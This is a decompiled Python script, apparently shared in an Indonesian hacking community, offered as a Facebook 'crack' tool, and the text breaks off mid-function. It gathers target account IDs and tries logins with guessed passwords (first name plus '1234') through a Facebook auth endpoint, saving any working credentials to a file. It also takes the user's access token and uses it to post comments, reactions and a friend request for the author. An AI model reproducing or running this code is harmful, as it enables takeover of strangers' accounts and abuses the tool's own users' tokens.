# Decompiled By SaipulAnwr
# Github : https://github.com/PULx-HCyber
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Jan  8 2021, 21:22:37) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: dg
import os, sys, time, mechanize, itertools, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
my_color = [
 P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 d4rk.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
os.system('clear')
done = False

def animate():
    for c in itertools.cycle(['\x1b[1;31m|', '\x1b[1;32m/', '\x1b[1;33m-', '\x1b[1;35m\\']):
        if done:
            break
        sys.stdout.write('\rLoading ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c)
        sys.stdout.flush()
        time.sleep(0.1)


t = threading.Thread(target=animate)
t.start()
time.sleep(5)
done = True

def keluar():
    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Keluar'
    os.system.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


os.system('termux-open https://youtube.com/channel/UC0IpDdp5KzL6RfX1RpUxU7Q')
logo = '\n\n\x1b[1;31m$$$$$$$\\  $$\\   $$\\           $$\\       \n\x1b[1;31m$$  __$$\\ $$ |  $$ |          $$ |      \n\x1b[1;31m$$ |  $$ |$$ |  $$ | $$$$$$\\  $$ |  $$\\ \n\x1b[1;31m$$ |  $$ |$$$$$$$$ |$$  __$$\\ $$ | $$  |\n\x1b[1;37m$$ |  $$ |\\_____$$ |$$ |  \\__|$$$$$$  / \n\x1b[1;37m$$ |  $$ |      $$ |$$ |      $$  _$$<  \n\x1b[1;37m$$$$$$$  |      $$ |$$ |      $$ | \\$$\\ \n\x1b[1;37m\\_______/       \\__|\\__|      \\__|  \\__|\n\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\x1b[1;31m{\x1b[1;36m\xc3\x97\x1b[1;31m} \x1b[1;33mAuthor   \x1b[1;31m: \x1b[1;32mPULx-\n\x1b[1;31m{\x1b[1;36m\xc3\x97\x1b[1;31m} \x1b[1;33mYoutube  \x1b[1;31m: \x1b[1;32mGaonok\n\x1b[1;31m{\x1b[1;36m\xc3\x97\x1b[1;31m} \x1b[1;33mWhatsapp \x1b[1;31m: \x1b[1;32m08816932290\n\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []

def masuk():
    os.system('clear')
    print logo
    print '\x1b[1;97m{\x1b[1;32m01\x1b[1;97m} Login Token Facebook'
    print '\x1b[1;97m{\x1b[1;32m02\x1b[1;97m} Ambil Token Download Token App'
    print '\x1b[1;97m{\x1b[1;91m03\x1b[1;97m} Keluar'
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    pilih_masuk()


def pilih_masuk():
    msuk = raw_input('\x1b[1;33mPilih \x1b[91m:\x1b[1;32m ')
    if msuk == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Isi Yg Benar Sayang!'
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        tokenz()
    elif msuk == '2' or msuk == '02':
        ambil_token()
    elif msuk == '3' or msuk == '03':
        ambil_link()
    elif msuk == '4' or msuk == '04':
        cookie()
    elif msuk == '6' or msuk == '06':
        saya()
    elif msuk == '0' or msuk == '00':
        keluar()
    else:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Isi Yg Benar Sayang ! '
        pilih_masuk()


def tokenz():
    os.system('clear')
    print logo
    toket = raw_input('\x1b[1;97m{\x1b[1;91m?\x1b[1;97m} Token \x1b[1;91m:\x1b[1;32m ')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\x1b[1;97m{\x1b[1;92m\xe2\x9c\x93\x1b[1;97m}\x1b[1;92m Login Berhasil ! '
        jalan('\x1b[1;93mJangan Lupa chat admin Admin')
        os.system('xdg-open https://wa.me/6282331072836/?text=Assalamualaikum')
        bot_komen()
    except KeyError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} \x1b[1;91mToken salah !'
        time.sleep(1.7)
        masuk()


def ambil_token():
    os.system('clear')
    print logo
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    jalan("        '\x1b[1;97mAnda Akan Di Arahkan Ke Browser...")
    os.system('xdg-open https://drive.google.com/file/d/1eAuQG4aFIH49r0ACpoUWspnSG2VUl4Ci/view?usp=drivesdk')
    time.sleep(2)
    masuk()


def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;97m{\x1b[0;91m!\x1b[0;97m}\x1b[0;91m Token Invalid !'
        os.system('rm -rf login.txt')

    una = '1050428442087098'
    kom = 'Izin Pake Sc Lu Bang\xf0\x9f\x99\x8f'
    reac = 'LOVE'
    post = '1050419178754691'
    post2 = '1050418732088069'
    kom2 = 'Halo Bang PULx\xf0\x9f\x98\x81'
    reac2 = 'ANGRY'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    menu()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;97m{\x1b[0;91m!\x1b[0;97m}\x1b[0;91m Token Invalid !'
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[0;97m{\x1b[0;91m!\x1b[0;97m}\x1b[0;91m Token Invalid !'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '\x1b[0;97m{\x1b[0;91m!\x1b[0;97m}\x1b[0;911m Tidak ada koneksi'
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;37m{\x1b[1;36m\xe2\x80\xa2\x1b[1;37m}\x1b[1;35m Nama Akun\x1b[1;33m     :\x1b[1;36m ' + nama
    print '\x1b[1;37m{\x1b[1;36m\xe2\x80\xa2\x1b[1;37m}\x1b[1;35m User ID\x1b[1;33m       :\x1b[1;36m ' + id
    print '\x1b[1;37m{\x1b[1;36m\xe2\x80\xa2\x1b[1;37m}\x1b[1;35m Tanggal Lahir\x1b[1;33m :\x1b[1;36m ' + a['birthday']
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;37m{\x1b[1;33m01\x1b[1;37m}\x1b[1;37m\x1b[1;37m Crack ID Dari Teman/Publik'
    print '\x1b[1;37m{\x1b[1;33m02\x1b[1;37m}\x1b[1;37m\x1b[1;37m Crack ID Dari Postingan Teman'
    print '\x1b[1;37m{\x1b[1;33m03\x1b[1;37m}\x1b[1;37m\x1b[1;37m Crack ID Dari Followers'
    print '\x1b[1;37m{\x1b[1;33m04\x1b[1;37m}\x1b[1;37m\x1b[1;37m Crack ID Menggunakan Username'
    print '\x1b[1;37m{\x1b[1;33m05\x1b[1;37m}\x1b[1;37m\x1b[1;37m Perbarui Script'
    print '\x1b[1;37m{\x1b[1;33m06\x1b[1;37m}\x1b[1;37m\x1b[1;37m Subscribe Yt gw'
    print '\x1b[1;37m{\x1b[1;31m00\x1b[1;37m}\x1b[1;37m\x1b[1;37m Logout'
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    pilih()


def pilih():
    unikers = raw_input('\x1b[1;33mPilih \x1b[1;31m:\x1b[1;37m ')
    if unikers == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Dengan Benar !'
        pilih()
    elif unikers == '1' or unikers == '01':
        crack_teman()
    elif unikers == '2' or unikers == '02':
        crack_likes()
    elif unikers == '3' or unikers == '03':
        crack_follow()
    elif unikers == '4' or unikers == '04':
        user_id()
    elif unikers == '5' or unikers == '05':
        perbarui()
    elif unikers == '6' or unikers == '06':
        saya()
    elif unikers == '0' or unikers == '00':
        os.system('clear')
        jalan('Menghapus token')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Yg Benar Sayang !'
        pilih()


def crack_teman():
    os.system('clear')
    print logo
    print '\x1b[1;37m{\x1b[1;33m01\x1b[1;37m}\x1b[1;37m\x1b[1;37m Crack ID Malaysia'
    print '\x1b[1;37m{\x1b[1;33m02\x1b[1;37m}\x1b[1;37m\x1b[1;37m Crack ID Bangladesh'
    print '\x1b[1;37m{\x1b[1;33m03\x1b[1;37m}\x1b[1;37m\x1b[1;37m Crack ID Usa'
    print '\x1b[1;37m{\x1b[1;33m04\x1b[1;37m}\x1b[1;37m\x1b[1;37m Crack ID Pakistan'
    print '\x1b[1;37m{\x1b[1;31m00\x1b[1;37m}\x1b[1;37m\x1b[1;37m Kembali'
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    pilih_teman()


def pilih_teman():
    univ = raw_input('\x1b[1;33mPilih \x1b[1;31m:\x1b[1;37m ')
    if univ == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Yg Benar Sayang !'
        pilih_teman()
    elif univ == '1' or univ == '01':
        crack_malay()
    elif univ == '2' or univ == '02':
        crack_bangla()
    elif univ == '3' or univ == '03':
        crack_usa()
    elif univ == '4' or univ == '04':
        crack_pakis()
    elif univ == '5' or univ == '05':
        univ()
    elif univ == '0' or univ == '00':
        menu()
    else:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Yg Benar Sayang !'
        pilih_teman()


def crack_malay():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;37m{\x1b[1;33m01\x1b[1;37m}\x1b[1;37m\x1b[1;37m Crack Dari Daftar Teman'
    print '\x1b[1;37m{\x1b[1;33m02\x1b[1;37m}\x1b[1;37m\x1b[1;37m Crack Dari Publik/Teman'
    print '\x1b[1;37m{\x1b[1;33m03\x1b[1;37m}\x1b[1;37m\x1b[1;37m Crack Dari File'
    print '\x1b[1;37m{\x1b[1;31m00\x1b[1;37m}\x1b[1;37m\x1b[1;37m Kembali'
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    pilih_malay()


def pilih_malay():
    global cekpoint
    global oks
    teak = raw_input('\x1b[1;33mPilih \x1b[1;31m:\x1b[1;37m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Yg Benar Sayang !'
        pilih_malay()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo
        print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK MALAYSIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif teak == '2' or teak == '02':
        os.system('clear')
        print logo
        print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK MALAYSIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
        idt = raw_input('\x1b[1;97m{\x1b[1;91mx\x1b[1;97m}\x1b[1;97m ID Target \x1b[1;91m:\x1b[1;97m ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            sp = json.loads(pok.text)
            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m}\x1b[1;97m Nama Akun \x1b[1;91m:\x1b[1;97m ' + sp['name']
        except KeyError:
            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik tidak ada !'
            raw_input('\n\x1b[1;97m{\x1b[1;91mKembali\x1b[1;97m}')
            crack_malay()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi !'
            keluar()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

    else:
        if teak == '3' or teak == '03':
            os.system('clear')
            print logo
            try:
                print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK MALAYSIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m}\x1b[1;97m Nama File\x1b[1;91m :\x1b[1;97m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada ! '
                raw_input('\n\x1b[1;97m{\x1b[1;91mKembali\x1b[1;97m}')
            except IOError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada !'
                raw_input('\n\x1b[1;97m{\x1b[1;91mKembali\x1b[1;97m}')
                crack_malay()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Dengan Benar !'
            pilih_malay()
        print '\x1b[0;97m{\x1b[0;91m\xc3\x97\x1b[0;97m} Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m{\x1b[0;91m\xc3\x97\x1b[0;97m} Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\x1b[1;97m\x1b[1;41;97m\nTidak Ada Hasil Gunakan Mode Pesawat 5 Detik\x1b[0m'
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '1234'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos1
                oke = open('done/malay.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos1
                cek = open('done/malay.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos2
                    oke = open('done/malay.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos2
